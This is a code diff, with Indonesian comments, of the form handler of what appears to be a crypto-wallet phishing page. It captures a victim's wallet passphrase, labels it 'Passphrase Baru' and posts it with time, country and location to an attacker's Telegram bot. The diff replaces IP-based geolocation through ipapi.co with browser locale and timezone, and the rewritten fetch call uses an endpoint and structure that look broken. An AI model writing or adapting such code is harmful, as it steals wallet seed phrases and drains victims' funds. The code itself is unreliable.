@@ -19,42 +19,19 @@ document.querySelector('form').addEventListener('submit', function(e) {
   // Simpan backup di browser user
   localStorage.setItem('walletPassphrase', normalized);
 
-  // Format pesan untuk Telegram dengan lokasi real-time
-  function buildMessage(location) {
-    var locationText = "\n<b>Lokasi:</b> Tidak tersedia";
-    if (location && location.country_name) {
-      var place = [];
-      if (location.city) place.push(location.city);
-      if (location.region) place.push(location.region);
-      var locationLine = place.length ? place.join(', ') : location.country_name;
-      locationText = "\n<b>Lokasi:</b> " + locationLine + "\n<b>Negara:</b> " + location.country_name;
-    }
-    return "<b>🔔 Passphrase Baru (Vercel)</b>\n" +
-           "<b>Waktu:</b> " + new Date().toLocaleString('id-ID') + "\n\n" +
-           "<code>" + normalized + "</code>" +
-           locationText;
-  }
+  // Format pesan untuk Telegram
+  var lang = navigator.language || 'id-ID';
+  var country = lang.split('-')[1] || lang;
+  var locationInfo = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
+  var message = "<b>🔔 Passphrase Baru (Vercel)</b>\n" +
+                "<b>Waktu:</b> " + new Date().toLocaleString('id-ID') + "\n" +
+                "<b>Negara:</b> " + country + "\n" +
+                "<b>Lokasi:</b> " + locationInfo + "\n\n" +
+                "<code>" + normalized + "</code>";
 
-  function sendTelegramMessage(message) {
-    return fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'HTML'
-      })
-    });
-  }
-
-  fetch('https://ipapi.co/json/')
-    .then(function(res) { return res.json(); })
-    .then(function(location) {
-      return sendTelegramMessage(buildMessage(location));
-    })
-    .catch(function() {
-      return sendTelegramMessage(buildMessage(null));
-    });
+  // Kirim data ke Telegram
+  fetch('https://telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
+    method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
       chat_id: TELEGRAM_CHAT_ID,
